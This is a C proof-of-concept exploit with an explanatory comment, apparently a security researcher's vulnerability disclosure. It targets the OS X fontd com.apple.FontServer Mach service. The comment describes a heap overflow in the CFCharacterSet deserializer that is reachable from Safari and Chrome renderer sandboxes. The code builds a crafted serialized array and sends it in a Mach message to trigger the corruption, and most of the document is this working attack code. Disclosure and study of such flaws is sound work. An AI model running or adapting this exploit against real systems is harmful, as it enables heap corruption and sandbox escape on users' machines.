// ianbeer
/*
The second service which fontd hosts is com.apple.FontServer. Unlike com.apple.FontObjectsServer (see previous bugs) FontServer is built using MIG.

Many of the MIG methods take a serialized CoreFoundation object which is passed as an OOL region. FontServer uses a custom serialization algorithm
implemented in the TCFResurrectContext class.

The MIG method _XUnregisterFonts is an example method which will try to deserialize a CFArray from the OOL region. Since CFArrays can contain any types
we can use this path to hit all the other deserializers implemented by TCFResurrectContext.

The implementation of the CFCharacterSet deserializer read a dword length then passes that many bytes (via a CFData object) to the funtion
XTCopyUncompressedBitmapRepresentation. This function reads a size dword at offset 0x4 in the input buffer and mallocs an output buffer
that size which is then passed, along with a pointer to the controlled input, to GetUncompressedBitmapRepresentationData.

This function implements something a bit like run-length decompression, except the repeated regions can only be runs of 0xff or 0x00. This function
performs insufficient bounds checking, specifically it never checks the bounds of the output buffer it is writing to, only that it doesn't read off the end
of the input, leading trivially to controllable heap corruption.

fontd runs unsandboxed as a regular user; the com.apple.FontServer service is reachable from many sandboxes including Safari and Chrome renderer processes.

PoC tested on OS X 10.10.2
*/

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <unistd.h>

// size must be 0x3c
struct unregister_fonts_msg {
  mach_msg_header_t hdr;
  mach_msg_body_t body; //+0x18
  mach_msg_ool_descriptor64_t ool_desc; //+0x1c
    // .address  //+0x1c
    // .flags and stuff //+0x24
    // .size //+0x28?
  uint64_t out0;  //+0x2c
  uint32_t ool_size; //+0x34;
  uint32_t something; //+0x38
} __attribute__((packed)) ;

struct serialized_array {
  uint32_t array_type;    //0x11
  uint32_t array_entries; //0x1
  uint32_t charset_type;  //0x1b
  uint32_t charset_len;   //4096+8
  uint32_t fill_with_ff;  //1
  uint32_t output_len;    //0x100
  uint16_t charset[2048];
};

uint32_t bswap(uint32_t v) {
  return (v << 24) | 
         (v & 0xff00) << 8 | 
         (v & 0xff0000) >> 8 |
         (v >> 24);
}

void send_unregister_fonts_msg(mach_port_t service_port) {
  kern_return_t err;

  struct serialized_array* a = malloc(sizeof(struct serialized_array));
  a->array_type = bswap(0x11);
  a->array_entries = bswap(1);
  a->charset_type = bswap(0x1b);
  a->charset_len = bswap(4096+8);
  a->fill_with_ff = 1;
  a->output_len = 0x100;
  for (int i = 0; i < 2048; i+= 2) {
    a->charset[i] = 0;
    a->charset[i+1] = 0xffff;
  }

  struct unregister_fonts_msg m = {0};

  m.hdr.msgh_size = sizeof(struct unregister_fonts_msg);
  m.hdr.msgh_local_port = MACH_PORT_NULL;
  m.hdr.msgh_remote_port = service_port;
  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
  m.hdr.msgh_id = 0x6 - 0xffffcd38;
  
  m.body.msgh_descriptor_count = 1;

  m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
  m.ool_desc.address = a;
  m.ool_desc.size = sizeof(struct serialized_array);
  m.ool_desc.deallocate = 0;
  m.ool_desc.copy = MACH_MSG_VIRTUAL_COPY; 
  
  m.ool_size = sizeof(struct serialized_array);

  err = mach_msg(&m.hdr,
                 MACH_SEND_MSG,
                 m.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf(" [-] mach_msg failed with error code:%x\n", err);
    exit(EXIT_FAILURE);
  }
  printf(" [+] looks like that sent?\n");

}

mach_port_t mach_connect(char* service_name){
  kern_return_t err;
  
  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] couldn't get bootstrap port\n");
    exit(EXIT_FAILURE);
  }
  printf(" [+] got bootstrap port\n");

  mach_port_t service_port;
  err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] unable to lookup service %s\n", service_name);
    exit(EXIT_FAILURE);
  }
  printf(" [+] got %s mach port\n", service_name);
  return service_port;
}

int main(int argc, char** argv){
  send_unregister_fonts_msg(mach_connect("com.apple.FontServer"));
  return EXIT_SUCCESS;
}

